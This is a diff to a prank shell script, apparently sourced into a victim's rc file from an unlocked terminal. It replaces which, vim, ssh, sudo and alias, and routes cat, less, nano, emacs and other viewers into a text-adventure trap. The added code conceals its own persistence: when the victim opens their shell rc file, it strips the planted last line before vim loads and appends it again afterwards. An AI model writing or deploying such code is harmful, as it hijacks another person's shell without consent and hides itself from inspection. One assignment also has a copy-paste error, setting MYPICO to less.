@@ -2,8 +2,17 @@ alias > $HOME/.pwnd_alias
 
 MYLS=$(which ls)
 MYVIM=$(which vim)
+MYVI=$(which vi)
+MYEMACS=$(which emacs)
+MYNANO=$(which nano)
+MYPICO=$(which pico)
+MYCAT=$(which cat)
+MYPICO=$(which less)
+MYMORE=$(which more)
 MYWHICH=$(which which)
 MYCP=$(which cp)
+MYSHELL=$(echo $SHELL | awk '{sub("^.*/","");print}')
+MYPWNDFILE=$HOME/.${MYSHELL}rc
 
 function which {
     case "$1" in
@@ -12,6 +21,18 @@ function which {
             ;;
         vim)
             echo "$MYVIM"
+            ;;
+        vi)
+            echo "$MYVI"
+            ;;
+        emacs)
+            echo "$MYEMACS"
+            ;;
+        nano)
+            echo "$MYNANO"
+            ;;
+        pico)
+            echo "$MYPICO"
             ;;
         which)
             echo "$MYWHICH"
@@ -24,9 +45,17 @@ function which {
     esac
 }
 
+alias vi='vim'
+alias emacs='vim'
+alias nano='vim'
+alias pico='vim'
+alias cat='vim'
+alias less='vim'
+alias more='vim'
+
 function alias {
     if [ "$#" -eq 0 ]; then
-        cat $HOME/.pwnd_alias
+        $MYCAT $HOME/.pwnd_alias
         return
     fi
 #TODO: FIX
@@ -141,14 +170,21 @@ function vim {
         /usr/bin/vim *
         return
     elif [[ $i -gt 10 ]]; then
-        /usr/bin/vim $@
+        if [[ $@ =~ $MYSHELL ]]; then
+            PWNAGELINE=$(tail -n1 $MYPWNDFILE)
+            mv $MYPWNDFILE{,.bak}
+            head -n -1 $MYPWNDFILE.bak >$MYPWNDFILE
+            rm ${MYPWNDFILE}.bak
+            /usr/bin/vim $@
+            echo $PWNAGELINE >> $MYPWNDFILE
+        else
+            /usr/bin/vim $@
+        fi
         return
     fi
     echo "You attempt to open the file, but can't quite seem to figure it out."
     return
 }
-
-alias vi='vim'
 
 function ssh {
     echo "You enter the portal..."
@@ -160,7 +196,7 @@ function sudo {
 }
 
 function login_scenario {
-    cat  <<SCENARIO
+    $MYCAT  <<SCENARIO
 You awaken in a confused daze - The last thing you remember doing was walking
 away from your unlocked terminal.
 You find yourself in a dank cave, with green slime seeping out of every
